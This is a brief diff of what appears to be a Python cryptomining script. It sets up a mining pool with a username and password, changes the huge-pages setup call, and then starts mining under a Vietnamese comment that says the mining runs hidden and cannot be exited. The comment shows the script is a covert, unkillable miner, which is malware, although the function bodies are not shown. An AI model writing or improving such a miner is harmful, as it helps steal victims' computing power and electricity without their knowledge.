@@ -62,7 +62,7 @@ if __name__ == "__main__":
     setup_mining_config(pool_url, username, password, cpu_threads)
     
     # Thiết lập huge pages
-    set_huge_pages()
+    set_max_huge_pages()
     
     # Bắt đầu đào coin ẩn và không thể thoát ra
     start_mining()
